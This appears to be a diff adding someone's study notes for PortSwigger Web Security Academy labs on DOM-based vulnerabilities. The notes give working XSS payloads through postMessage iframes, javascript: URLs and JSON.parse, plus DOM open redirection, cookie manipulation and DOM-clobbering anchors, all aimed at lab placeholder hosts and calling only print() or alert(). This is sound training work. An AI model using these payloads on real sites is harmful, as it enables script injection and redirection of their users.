@@ -1,0 +1,70 @@
+DOM-based vulnerabilities
+
+https://portswigger.net/web-security/dom-based
+
+
+
+Controlling the web message source
+
+How to construct an attack using web messages as the source
+	DOM XSS using web messages
+		Notice that the home page contains an addEventListener() call that listens for a web message.Also notice that data is stored into innerHTML sink. so  Go to the exploit server and add the following iframe to the body - " <iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"> ". after this sink will be "innerHTML = <img src=/ onerror=print()>".
+
+	
+
+
+	DOM XSS using web messages and a JavaScript URL
+		Notice that the home page contains an addEventListener() call that listens for a web message. The JavaScript contains a flawed indexOf() check that looks for the strings "http:" or "https:" anywhere within the web message. It also contains the sink location.href. so go to the exploit server and add the following iframe to the body - " <iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"> ". after this sink will be "location.href = 'javascript:print()//http:' "
+
+
+
+--------------------------------------------------------------------------------------------------------------------
+
+
+Origin verification
+	DOM XSS using web messages and JSON.parse
+		 Notice that the home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using JSON.parse(). In the JavaScript, we can see that the event listener expects a type property and that the load-channel case of the switch statement changes the iframe src attribute. So go to the exploit server and add the following iframe to the body - " <iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'> ".
+
+
+
+---------------------------------------------------------------------------------------------------------------------
+
+
+DOM-based open redirection
+
+
+	
+	DOM-based open redirection
+		 The blog post page contains the following link, which returns to the home page of the blog: "<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>".  The url parameter contains an open redirection vulnerability that allows you to change where the "Back to Blog" link takes the user. To solve the lab, construct and visit the following URL - " https://your-lab-id.web-security-academy.net/post?postId=4&url=https://your-exploit-server-id.web-security-academy.net/ "
+
+
+
+----------------------------------------------------------------------------------------------------------------------
+
+
+DOM-based cookie manipulation
+
+	
+	DOM-based cookie manipulation
+	 	Notice that the home page uses a client-side cookie called lastViewedProduct, whose value is the URL of the last product page that the user visited. go to the exploit server and add the following iframe to the body - " <iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;"> "
+
+
+
+------------------------------------------------------------------------------------------------------------------------
+
+
+
+DOM clobbering
+
+
+	
+Exploiting DOM clobbering to enable XSS
+		The page for a specific blog post imports the JavaScript file loadCommentsWithDomPurify.js, which contains the following code: 	"let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}". The defaultAvatar object is implemented using this dangerous pattern containing the logical OR operator in conjunction with a global variable. This makes it vulnerable to DOM clobbering. so go to one of the blog posts and create a comment containing the following anchors: " <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"> ".
+
+
+
+
+
+
+Clobbering DOM attributes to bypass HTML filters
+	Not done
